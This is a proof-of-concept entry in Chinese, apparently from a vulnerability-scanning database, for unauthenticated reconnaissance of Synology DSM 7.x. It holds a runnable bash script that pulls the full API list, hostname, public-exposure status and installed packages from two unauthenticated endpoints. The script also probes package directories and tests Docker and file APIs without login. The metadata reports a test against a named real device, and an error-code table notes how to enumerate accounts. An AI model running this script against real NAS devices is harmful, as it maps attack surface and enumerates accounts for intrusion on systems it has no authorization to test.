# Synology DSM 未授权侦察 —— 两端点泄露 API 清单 / 主机名 / 公网状态 / 全部已装套件

- **code**: synology-dsm-unauth-initdata-recon
- **kind**: poc
- **category**: info-leak
- **component**: Synology DSM 7.x
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.39（群晖 DS918+，主机名 yeaps918plus，DSM 7.2.x）实测验证：API.Info 返回 1131 个 API 定义（nuclei 模板 synology-dsm-system-info 亦独立匹配）；Initdata 返回 3,015,292 字节，含 Session{hostname:yeaps918plus, isPublic:true} 与 232 个已装模块路径，据此提取出 42 个第三方套件（alist3/natpierce/ContainerManager/qBittorrent/Jellyfin/SurveillanceStation 等）。/webman/3rdparty/ContainerManager/MainVue.js 未鉴权下载 2,581,752 字节并提取出完整 SYNO.Docker.* API 清单。同时确认 /webman/3rdparty/<pkg>/ 对已装套件返回 403、未装返回 404，可用于套件存在性判定。
- **path**: pocs/synology-dsm-unauth-initdata-recon/synology_dsm_unauth_recon.sh
- **tags**: synology,DSM,未授权,信息泄露,套件枚举,攻击面,群晖,侦察
- **created_at**: 2026-10-15T21:29:27.947Z
- **found_by**: vuln-scan

## 描述

Synology DSM 7.x 未授权侦察手法：SYNO.API.Info 与 SYNO.Core.Desktop.Initdata 两个端点在未登录状态返回完整数据，前者泄露 1000+ API 清单（攻击面地图），后者泄露主机名、公网暴露状态与全部已装第三方套件（从 JSConfig 的 webman/3rdparty/ 路径提取）。配套群晖错误码速查表与账号枚举判据。

## 用法

```
bash synology_dsm_unauth_recon.sh（改 TARGET 后运行）
或手动：
curl -s "http://IP:5000/webapi/entry.cgi?api=SYNO.API.Info&version=1&method=query&query=all"
curl -s "http://IP:5000/webapi/entry.cgi?api=SYNO.Core.Desktop.Initdata&version=1&method=get"
群晖错误码：103=需认证 / 102=参数错 / 119=API不存在 / 400=账号不存在(登录) / 429=登录封禁
套件 Web 入口探测：/webman/3rdparty/<pkg>/ 返回 403（非404）即表示套件已安装。
静态 bundle 常未鉴权（如 ContainerManager/MainVue.js），下载后用 grep -oE "SYNO\.[A-Za-z.]+" 提取完整 API 清单。
```

## 正文

```
#!/bin/bash
# Synology DSM 未授权侦察：两个无需认证的端点可拿到主机名、公网状态与全部已装套件
#
# 原理：
#   DSM 7.x 的 /webapi/entry.cgi 上，SYNO.API.Info 与 SYNO.Core.Desktop.Initdata 两个 API
#   在未认证状态下仍返回完整数据（设计为登录页初始化使用），构成信息泄露。
#
# 价值：
#   - API.Info  → 泄露 1000+ 个 API 名称/版本/路径（完整攻击面地图，可据此逐个测未授权）
#   - Initdata  → 泄露 Session{hostname, isPublic, is_admin} + JSConfig(全部已装模块路径)
#                 + Strings + CSSFiles。从 JSConfig 的 webman/3rdparty/<pkg>/ 路径可提取
#                 【全部已装第三方套件清单】——这是最高价值的部分（直接给出攻击面全景）
#
# 判读要点：
#   Session.isPublic = true  → 该 NAS 直接暴露公网
#   Session.hostname         → 设备名（常含型号线索，如 xxx918plus = DS918+）
#   已装套件里的高价值项：ContainerManager(Docker,root) / natpierce(内网穿透) /
#                        qBittorrent / Jellyfin / alist3 / SurveillanceStation / Virtualization

TARGET="http://TARGET_HOST:5000"

echo "========== [1] API 清单泄露（1131 个 API）=========="
curl -s "$TARGET/webapi/entry.cgi?api=SYNO.API.Info&version=1&method=query&query=all" \
  -o apis.json
python3 -c "
import json
d=json.load(open('apis.json'))
print('API 总数:', len(d.get('data',{})))
"

echo "========== [2] Initdata 未授权（主机名 + 公网状态 + 套件清单）=========="
curl -s "$TARGET/webapi/entry.cgi?api=SYNO.Core.Desktop.Initdata&version=1&method=get" \
  -o initdata.json
python3 -c "
import json,re
d=json.load(open('initdata.json')).get('data',{})
print('Session:', json.dumps(d.get('Session',{}), ensure_ascii=False))
jc=d.get('JSConfig',{})
pkgs=sorted({m.group(1) for k in jc for m in [re.match(r'webman/3rdparty/([^/]+)/',k)] if m})
print('已装第三方套件 (%d):' % len(pkgs))
for p in pkgs: print('  -', p)
print('模块路径总数:', len(jc))
"

echo "========== [3] 逐个套件测未授权 Web 入口 =========="
# 群晖套件 Web 目录：/webman/3rdparty/<pkg>/  → 403 表示目录存在但禁止列表
# 具体文件名（example.com/INFO/package.json）通常是 404
# 但静态 JS bundle 常未鉴权：/webman/3rdparty/<pkg>/<bundle>.js → 200
# 下载 bundle 后用 grep 提取 SYNO.* API 清单，即得该套件的完整控制接口
for pkg in ContainerManager Jellyfin FileBrowser qBittorrent alist3 natpierce; do
  printf "  %-22s dir-> " "$pkg"
  curl -s -o /dev/null -w "%{http_code}\n" "$TARGET/webman/3rdparty/$pkg/"
done
echo "  ※ 403 = 目录存在（非404），可据此确认套件已安装"

echo "========== [4] 关键 API 未授权测试（用 [1] 的清单）=========="
for api in SYNO.Core.Desktop.Initdata SYNO.API.Info SYNO.Core.Desktop.Defs \
           SYNO.Docker.Container SYNO.FileStation.List SYNO.Core.Package; do
  printf "  %-34s -> " "$api"
  curl -s "$TARGET/webapi/entry.cgi?api=${api}&version=1&method=list" | head -c 120
  echo ""
done

# 错误码速查（群晖特有，用于判断 API 状态）：
#   103 = 需要认证（API 存在，权限不足）
#   102 = 参数错误（API 存在）
#   119 = API 不存在 或 method/version 不匹配
#   400 = 账号不存在（登录时）—— 注意：与 103(密码错) 组合可做账号枚举
#   429 = 登录次数过多被临时封禁（NS 的 LoginAttempts 机制）

```
